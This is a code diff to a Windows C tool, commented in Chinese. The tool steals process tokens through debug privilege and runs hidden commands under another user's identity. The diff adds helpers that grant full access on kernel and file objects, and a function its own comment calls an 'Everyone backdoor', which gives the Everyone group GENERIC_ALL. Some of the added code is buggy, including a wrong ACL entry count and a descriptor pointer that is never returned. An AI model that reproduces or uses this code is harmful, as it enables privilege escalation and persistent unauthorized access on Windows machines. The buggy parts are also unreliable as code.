@@ -31,13 +31,34 @@ BOOL EnablePrivilegeDebug();
 HANDLE GetTokenViaProcessID(DWORD ProcessID);
 ///////////////////////////////////////////
 
+// 为内核对象添加ACL
+DWORD AddAceToObjectsSecurityDescriptor(
+	LPTSTR pszObjName,          // name of object
+	SE_OBJECT_TYPE ObjectType,  // type of object
+	LPTSTR pszTrustee,          // trustee for new ACE
+	TRUSTEE_FORM TrusteeForm,   // format of trustee structure
+	DWORD dwAccessRights,       // access mask for new ACE
+	ACCESS_MODE AccessMode,     // type of ACE
+	DWORD dwInheritance         // inheritance flags for new ACE
+);
+
+// 为文件对象添加ACL
+DWORD AddAceToObjectsSecurityDescriptorByHandle(
+	HANDLE handle,          // handle to the object from which to retrieve security information
+	LPTSTR pszTrustee,          // trustee for new ACE
+	TRUSTEE_FORM TrusteeForm,   // format of trustee structure
+	DWORD dwAccessRights,       // access mask for new ACE
+	ACCESS_MODE AccessMode,     // type of ACE
+	DWORD dwInheritance         // inheritance flags for new ACE
+);
 
 ////////////////////////////////////////////
 // 模拟进程并执行命令
 BOOL ImpersonatedProcessToRunCommand(HANDLE hToken, LPWSTR Oommand);
 ///////////////////////////////////////////
-
 DWORD ForeachProcess(PSID pFilterSID);
+// 创建EveryOne后门
+BOOL SetEveryOneDoor(PSECURITY_DESCRIPTOR pSD);
 
 
 DWORD ForeachProcess(PSID pFilterSID) {
@@ -49,7 +70,6 @@ DWORD ForeachProcess(PSID pFilterSID) {
 	PSECURITY_DESCRIPTOR psi = NULL;
 	BOOL bMore = FALSE;
 	PTOKEN_OWNER SidOwner = NULL;
-	PTOKEN_GROUPS pGroupInfo;
 	DWORD dwRet = NULL;
 	HANDLE hProcessSanp = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	pe32.dwSize = sizeof(PROCESSENTRY32);
@@ -139,6 +159,37 @@ DWORD ForeachProcess(PSID pFilterSID) {
 	}
 	CloseHandle(hProcessSanp);
 	return 0;
+}
+
+BOOL SetEveryOneDoor(PSECURITY_DESCRIPTOR pSD)
+{
+	DWORD dwRes = NULL;
+	PSID pEveryoneSID = NULL;
+	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
+	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
+	EXPLICIT_ACCESS ea[1];
+	PACL pACL = NULL;
+	// 初始化Everyone的SID
+	AllocateAndInitializeSid(&SIDAuthWorld, 1,SECURITY_WORLD_RID,0, 0, 0, 0, 0, 0, 0,&pEveryoneSID);
+	
+	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
+
+	ea[0].grfAccessPermissions = GENERIC_ALL;
+	ea[0].grfAccessMode = SET_ACCESS;
+	ea[0].grfInheritance = NO_INHERITANCE;
+	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
+	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+	ea[0].Trustee.ptstrName = (LPTSTR)pEveryoneSID;
+	dwRes = SetEntriesInAcl(2, ea, NULL, &pACL);
+	pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,SECURITY_DESCRIPTOR_MIN_LENGTH);
+	InitializeSecurityDescriptor(pSD,SECURITY_DESCRIPTOR_REVISION);
+	if (!SetSecurityDescriptorDacl(pSD,
+		TRUE,     // bDaclPresent flag   
+		pACL,
+		FALSE)) {
+		return FALSE;
+	}
+	return TRUE;
 }
 
 PSID GetUserSID(LPCWSTR UserName) {
@@ -276,7 +327,12 @@ BOOL ImpersonatedProcessToRunCommand(HANDLE hToken, LPWSTR Oommand)
 	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
 	startupInfo.wShowWindow = SW_HIDE; // 隐藏窗口
 	startupInfo.cb = sizeof(STARTUPINFO);
+	/*
+	AddAceToObjectsSecurityDescriptorByHandle(
+		duplicateTokenHandle,
 
+		)
+	*/
 	BOOL bCreate = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL , Oommand, 0, NULL, NULL, &startupInfo, &processInformation);
 	if (bCreate == NULL) {
 		wprintf(TEXT("CreateProcessWithToken Error : %d \n"),GetLastError());
@@ -292,7 +348,137 @@ BOOL ImpersonatedProcessToRunCommand(HANDLE hToken, LPWSTR Oommand)
 	return TRUE;
 }
 
+DWORD AddAceToObjectsSecurityDescriptor(
+	LPTSTR pszObjName,          // name of object
+	SE_OBJECT_TYPE ObjectType,  // type of object
+	LPTSTR pszTrustee,          // trustee for new ACE
+	TRUSTEE_FORM TrusteeForm,   // format of trustee structure
+	DWORD dwAccessRights,       // access mask for new ACE
+	ACCESS_MODE AccessMode,     // type of ACE
+	DWORD dwInheritance         // inheritance flags for new ACE
+)
+{
+	DWORD dwRes = 0;
+	PACL pOldDACL = NULL, pNewDACL = NULL;
+	PSECURITY_DESCRIPTOR pSD = NULL;
+	EXPLICIT_ACCESS ea;
 
+	if (NULL == pszObjName)
+		return ERROR_INVALID_PARAMETER;
+
+	// Get a pointer to the existing DACL.
+
+	dwRes = GetNamedSecurityInfo(pszObjName, ObjectType,
+		DACL_SECURITY_INFORMATION,
+		NULL, NULL, &pOldDACL, NULL, &pSD);
+	if (ERROR_SUCCESS != dwRes) {
+		printf("GetNamedSecurityInfo Error %u\n", dwRes);
+		goto Cleanup;
+	}
+
+	// Initialize an EXPLICIT_ACCESS structure for the new ACE. 
+
+	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
+	ea.grfAccessPermissions = dwAccessRights;
+	ea.grfAccessMode = AccessMode;
+	ea.grfInheritance = dwInheritance;
+	ea.Trustee.TrusteeForm = TrusteeForm;
+	ea.Trustee.ptstrName = pszTrustee;
+
+	// Create a new ACL that merges the new ACE
+	// into the existing DACL.
+
+	dwRes = SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL);
+	if (ERROR_SUCCESS != dwRes) {
+		printf("SetEntriesInAcl Error %u\n", dwRes);
+		goto Cleanup;
+	}
+
+	// Attach the new ACL as the object's DACL.
+
+	dwRes = SetNamedSecurityInfo(pszObjName, ObjectType,
+		DACL_SECURITY_INFORMATION,
+		NULL, NULL, pNewDACL, NULL);
+	if (ERROR_SUCCESS != dwRes) {
+		printf("SetNamedSecurityInfo Error %u\n", dwRes);
+		goto Cleanup;
+	}
+
+Cleanup:
+
+	if (pSD != NULL)
+		LocalFree((HLOCAL)pSD);
+	if (pNewDACL != NULL)
+		LocalFree((HLOCAL)pNewDACL);
+
+	return dwRes;
+}
+
+DWORD AddAceToObjectsSecurityDescriptorByHandle(
+	HANDLE handle,				// name of object
+	LPTSTR pszTrustee,          // trustee for new ACE
+	TRUSTEE_FORM TrusteeForm,   // format of trustee structure
+	DWORD dwAccessRights,       // access mask for new ACE
+	ACCESS_MODE AccessMode,     // type of ACE
+	DWORD dwInheritance         // inheritance flags for new ACE
+) {
+
+	DWORD dwRes = 0;
+	PACL pOldDACL = NULL, pNewDACL = NULL;
+	PSECURITY_DESCRIPTOR pSD = NULL;
+	EXPLICIT_ACCESS ea; // 策略
+	SE_OBJECT_TYPE ObjectType = SE_KERNEL_OBJECT;
+	if (NULL == handle)
+		return ERROR_INVALID_PARAMETER;
+
+	// Get a pointer to the existing DACL.
+
+	dwRes = GetSecurityInfo(handle, ObjectType,
+		DACL_SECURITY_INFORMATION,
+		NULL, NULL, &pOldDACL, NULL, &pSD);
+	if (ERROR_SUCCESS != dwRes) {
+		printf("GetSecurityInfo Error %u\n", dwRes);
+		goto Cleanup;
+	}
+
+	// Initialize an EXPLICIT_ACCESS structure for the new ACE. 
+
+	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
+	ea.grfAccessPermissions = GENERIC_ALL;
+	ea.grfAccessMode = GRANT_ACCESS;
+	ea.grfInheritance = NO_INHERITANCE;
+	ea.Trustee.TrusteeForm = TrusteeForm;
+	ea.Trustee.ptstrName = pszTrustee;
+
+	// Create a new ACL that merges the new ACE
+	// into the existing DACL.
+
+	dwRes = SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL);
+	if (ERROR_SUCCESS != dwRes) {
+		printf("SetEntriesInAcl Error %u\n", dwRes);
+		goto Cleanup;
+	}
+
+	// Attach the new ACL as the object's DACL.
+
+	dwRes = SetSecurityInfo(handle, ObjectType,
+		DACL_SECURITY_INFORMATION,
+		NULL, NULL, pNewDACL, NULL);
+	if (ERROR_SUCCESS != dwRes) {
+		printf("SetSecurityInfo Error %u\n", dwRes);
+		goto Cleanup;
+	}
+
+Cleanup:
+
+	if (pSD != NULL)
+		LocalFree((HLOCAL)pSD);
+	if (pNewDACL != NULL)
+		LocalFree((HLOCAL)pNewDACL);
+
+	return dwRes;
+
+}
 int wmain(int argc, _TCHAR* argv[])
 {
 	if (!EnablePrivilegeDebug()) {
